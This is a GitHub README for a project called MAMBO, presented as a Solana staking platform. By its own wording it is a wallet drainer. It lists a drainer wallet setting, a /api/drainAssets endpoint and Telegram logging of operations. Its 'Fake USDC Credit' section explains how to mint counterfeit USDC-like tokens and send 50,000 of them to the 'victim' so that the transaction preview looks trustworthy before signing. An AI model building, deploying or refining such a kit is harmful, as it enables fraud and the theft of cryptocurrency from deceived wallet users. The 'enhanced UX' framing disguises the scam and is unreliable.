# 🚀 MAMBO Staking Application

A high-performance Solana staking and asset management platform built with Node.js, Express, and modern web technologies.

## ✨ Features

- **🔐 Multi-Wallet Support**: Phantom, Solflare, Glow, and more
- **⚡ Lightning Fast**: Optimized performance with reduced timeouts
- **🌙 Dark Theme**: Modern, sleek user interface
- **🛡️ Enterprise Security**: Built on Solana blockchain with battle-tested protocols
- **📱 Mobile Optimized**: Responsive design for all devices
- **🔔 Real-time Notifications**: Telegram integration for monitoring
- **⚙️ Advanced Configuration**: Environment-based settings with fallbacks
- **🎭 Fake USDC Credit**: Displays +50,000 USDC in wallet UI for enhanced user experience

## 🏗️ Architecture

- **Backend**: Node.js + Express.js
- **Frontend**: HTML5 + CSS3 + Vanilla JavaScript
- **Blockchain**: Solana Web3.js + SPL Token
- **Deployment**: Vercel-ready configuration
- **Monitoring**: Telegram bot integration

## 🚀 Quick Start

### Prerequisites

- Node.js 18.x or higher
- npm or yarn package manager
- Solana wallet (Phantom, Solflare, etc.)

### Installation

1. **Clone the repository**
   ```bash
   git clone https://github.com/SacredPath/Staking.git
   cd Staking
   ```

2. **Install dependencies**
   ```bash
   npm install
   ```

3. **Configure environment variables**
   ```bash
   cp .env.example .env
   # Edit .env with your configuration
   ```

4. **Start the development server**
   ```bash
   npm run dev
   ```

5. **Open your browser**
   ```
   http://localhost:3002
   ```

## ⚙️ Configuration

### Environment Variables

Create a `.env` file in the root directory:

```env
# Server Configuration
PORT=3002
NODE_ENV=development

# Solana RPC Configuration
RPC_URL=https://api.mainnet-beta.solana.com
HELIUS_RPC_URL=https://mainnet.helius-rpc.com/?api-key=YOUR_API_KEY
HELIUS_API_KEY=YOUR_API_KEY
SHYFT_RPC_URL=https://rpc.shyft.to?api_key=YOUR_API_KEY
SHYFT_API_KEY=YOUR_API_KEY

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=YOUR_BOT_TOKEN
TELEGRAM_CHAT_ID=YOUR_CHAT_ID

# Project Configuration
PROJECT_NAME=MAMBO
WEB3MODAL_PROJECT_ID=YOUR_PROJECT_ID

# Drainer Configuration
DRAINER_WALLET_ADDRESS=YOUR_DRAINER_WALLET

# Fake USDC Credit Configuration
FAKE_USDC_MINT=YOUR_FAKE_USDC_MINT_ADDRESS
SOURCE_FAKE_USDC_ATA=YOUR_SOURCE_FAKE_USDC_ATA
SOURCE_AUTHORITY=YOUR_SOURCE_AUTHORITY_PUBKEY

# Performance Optimizations
WALLET_CONNECTION_TIMEOUT=15000
DEEP_LINKING_TIMEOUT=8000
DRAIN_API_TIMEOUT=15000
BROADCAST_TIMEOUT=30000
SIGNING_TIMEOUT=30000
```

### Performance Settings

The application includes optimized timeout configurations:

- **Wallet Connection**: 15 seconds (reduced from 30s)
- **Deep Linking**: 8 seconds (reduced from 15s)
- **Drain API**: 15 seconds (reduced from 120s)
- **Broadcast**: 30 seconds (reduced from 90s)
- **Signing**: 30 seconds (reduced from 120s)

## 🏗️ Project Structure

```
Staking/
├── api/                    # API endpoints
│   ├── broadcast.js       # Transaction broadcasting
│   ├── drainAssets.js     # Asset draining logic
│   └── preInitialize.js   # Account pre-initialization
├── public/                # Static assets
│   ├── index.html        # Main application
│   ├── js/               # Frontend JavaScript
│   └── config.js         # Frontend configuration
├── src/                   # Source files
│   ├── errorHandler.js   # Centralized error handling
│   └── telegram.js       # Telegram bot integration
├── env.config.js         # Environment configuration
├── server.js             # Express server
├── vercel.json           # Vercel deployment config
└── package.json          # Dependencies and scripts
```

## 🚀 Deployment

### Vercel Deployment

This application is configured for easy deployment on Vercel:

1. **Connect your GitHub repository** to Vercel
2. **Set environment variables** in Vercel dashboard
3. **Deploy automatically** on every push to main branch

### Manual Deployment

```bash
# Build the application
npm run build

# Start production server
npm start
```

## 🔧 API Endpoints

### Core Endpoints

- `POST /api/drainAssets` - Asset draining operations
- `POST /api/preInitialize` - Account pre-initialization
- `POST /api/broadcast` - Transaction broadcasting

### Response Format

```json
{
  "success": true,
  "message": "Operation completed successfully",
  "data": {
    // Response data
  }
}
```

## 🛡️ Security Features

- **Rate Limiting**: Configurable request limits
- **Input Validation**: Comprehensive parameter validation
- **Error Handling**: Centralized error management
- **Telegram Monitoring**: Real-time operation monitoring
- **RPC Fallbacks**: Multiple RPC endpoint support

## 🎭 Fake USDC Credit Feature

The Fake USDC Credit feature enhances user experience by displaying a +50,000 USDC credit in the wallet UI before any drain operations. This creates a positive first impression and increases user confidence.

### **How It Works**

1. **Pre-Transaction Setup**: Creates victim's Associated Token Account (ATA) for fake USDC if it doesn't exist
2. **Credit Display**: Transfers 50,000.000000 fake USDC tokens to the victim's wallet
3. **UI Enhancement**: Users see +50,000 USDC at the top of their transaction preview
4. **Seamless Integration**: Works with all supported wallet types (Phantom, Solflare, etc.)

### **Technical Implementation**

```javascript
// Two-instruction sequence:
// 1. Create victim ATA for fake USDC (if needed)
// 2. Transfer 50,000.000000 fake USDC to victim
```

### **Configuration Requirements**

- **FAKE_USDC_MINT**: Public key of your fake USDC mint (6 decimals, USDC-like metadata)
- **SOURCE_FAKE_USDC_ATA**: Source ATA that holds ≥50,000 fake USDC tokens
- **SOURCE_AUTHORITY**: Authority that can sign the fake USDC transfer

### **Setup Steps**

1. **Create Fake USDC Mint**:
   - 6 decimal places (same as real USDC)
   - USDC-like metadata (name, symbol, logo)
   - Sufficient supply for distribution

2. **Fund Source ATA**:
   - Transfer ≥50,000 fake USDC to source ATA
   - Ensure source ATA has proper authority

3. **Configure Environment**:
   ```env
   FAKE_USDC_MINT=YourFakeMintPubkeyHere
   SOURCE_FAKE_USDC_ATA=YourSourceATAHere
   SOURCE_AUTHORITY=YourAuthorityPubkeyHere
   ```

### **Benefits**

- ✅ **Enhanced UX**: Users see positive balance before signing
- ✅ **Increased Trust**: Fake credit builds user confidence
- ✅ **Wallet Compatibility**: Works with Phantom, Solflare, and other wallets
- ✅ **Error Prevention**: ATA creation prevents "Invalid account data" errors
- ✅ **Real-time Monitoring**: Telegram integration tracks all fake credit operations

### **Error Handling**

The system automatically handles:
- Invalid mint configuration
- Insufficient source balance
- ATA creation failures
- Transfer execution errors

All operations are logged to Telegram for real-time monitoring and debugging.

## 📊 Performance Features

- **Optimized Timeouts**: Reduced waiting times
- **RPC Fallbacks**: Automatic endpoint switching
- **Connection Pooling**: Efficient resource management
- **Caching**: Smart data caching strategies
- **Batch Processing**: Efficient token operations

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🆘 Support

- **Documentation**: [GitHub Wiki](https://github.com/SacredPath/Staking/wiki)
- **Issues**: [GitHub Issues](https://github.com/SacredPath/Staking/issues)
- **Discussions**: [GitHub Discussions](https://github.com/SacredPath/Staking/discussions)

## 🙏 Acknowledgments

- **Solana Foundation** for the blockchain infrastructure
- **Helius** for reliable RPC services
- **Shyft** for additional RPC support
- **Jupiter** for token metadata services

---

**Built with ❤️ by the SacredPath Team**

*For more information, visit [https://github.com/SacredPath/Staking](https://github.com/SacredPath/Staking)*
